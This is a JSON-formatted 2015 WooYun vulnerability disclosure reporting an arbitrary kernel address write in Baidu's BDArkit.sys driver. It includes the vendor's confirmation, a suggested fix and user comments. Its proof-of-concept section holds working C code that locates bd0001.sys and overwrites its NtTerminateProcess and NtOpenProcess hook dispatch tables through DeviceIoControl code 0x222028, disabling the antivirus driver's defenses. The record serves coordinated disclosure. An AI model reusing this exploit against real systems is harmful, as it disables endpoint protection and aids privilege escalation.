{"id": 22144, "wybug_id": "wooyun-2015-0105389", "wybug_title": "百度BDArkit驱动任意地址写漏洞", "wybug_corp": "百度", "wybug_author": "Lynch", "wybug_date": "2015-04-02 15:05", "wybug_open_date": "2015-07-02 16:20", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向公众公开  简要描述： BDArkit.sys未检查DeviceIoControl传入地址的有效性，如果传入内核空间地址，可以造成任意地址写。 详细说明：  BDArkit.sys在IoControlCode=0x222028时，未检查传入地址的有效性，如果传入内核空间地址，可以造成任意地址写。如果传入bd0001.sys模块内保存的函数分发表地址，可造成驱动防御功能失效。   漏洞证明：  \nDWORD GetDriverBase(CHAR* pName){\ttypedef struct _SYSTEM_MODULE_INFORMATION {\t\tULONG Reserved [2]; \t\tPVOID Base; \t\tULONG Size; \t\tULONG Flags; \t\tUSHORT Index; \t\tUSHORT Unknown; \t\tUSHORT LoadCount; \t\tUSHORT ModuleNameOffset; \t\tCHAR ImageName [256 ]; \t} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; \ttypedef LONG (WINAPI* FN_ZwQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);\tFN_ZwQuerySystemInformation fn = \t\t(FN_ZwQuerySystemInformation)GetProcAddress(GetModuleHandle(_T(\"ntdll\")), \"ZwQuerySystemInformation\");\tif(!fn)\t\treturn 0;\tDWORD dwBase = 0;\tCHAR* pBuffer = new CHAR[0x10000];\tmemset(pBuffer, 0, 0x10000);\tULONG cb = 0;\tLONG l = (*fn)(11, pBuffer, 0x10000, &cb);\tif(0 == l)\t{\t\tULONG count = *((ULONG*)pBuffer);\t\tPSYSTEM_MODULE_INFORMATION pInfo = (PSYSTEM_MODULE_INFORMATION)(pBuffer + sizeof(ULONG));\t\tfor (ULONG i = 0; i < count; ++i)\t\t{\t\t\tif('\\0' != pInfo[i].ImageName[0])\t\t\t{\t\t\t\tstrlwr(pInfo[i].ImageName);\t\t\t\t\t\t\tif(pName && strstr(pInfo[i].ImageName, pName))\t\t\t\t{\t\t\t\t\tdwBase = (DWORD)pInfo[i].Base;\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t}\t}\tdelete pBuffer;\treturn dwBase;}void Fuzz2(HANDLE hDev){\tDWORD bd0001Base = GetDriverBase(\"bd0001.sys\");\tif(!bd0001Base)\t\treturn;\tDWORD code = 0x222028;\tchar inputBuff[0x1000] = { 0 };\tDWORD inputLen = 0xfc4;\tDWORD dwReturned = 0;\tDWORD a[] = {0x0000000a,0xfc4};\tfor(DWORD i = 0; i < sizeof(a)/sizeof(*a); ++i)\t{\t\t*((DWORD*)(inputBuff + 4*i)) = a[i];\t}\tDeviceIoControl(hDev,\t\tcode, \t\t(LPVOID)inputBuff,\t\tinputLen, \t\t(LPVOID)(bd0001Base + 0x14e80), // NtTerminateProcess的Hook函数分发表\t\t0, \t\t&dwReturned,\t\tNULL);\tDeviceIoControl(hDev,\t\tcode, \t\t(LPVOID)inputBuff,\t\tinputLen, \t\t(LPVOID)(bd0001Base + 0x132a8), // NtOpenProcess的Hook函数分发表\t\t0, \t\t&dwReturned,\t\tNULL);}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\BDArKit\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif(INVALID_HANDLE_VALUE != hDev)\t{\t\tFuzz2(hDev);\t\tCloseHandle(hDev);\t}}BOOL DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved\t\t\t\t\t ){    Fuzz1();    return TRUE;}\n   修复方案：  增加对DeviceIoControl输入输出参数的检验。   版权声明：转载请注明来源 Lynch@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-03 16:18 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-08 00:10 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  厉害啊。坐等公开    \n     2015-07-02 17:31 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  真搞不懂百度杀毒还有什么脸做下去，基本上每次来乌云首页都能看到百度杀毒又出重大漏洞，而且推广方式还那么流氓，这种杀毒软件的存在除了给白帽子送rank和祸害广大网民以外毫无任何意义。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}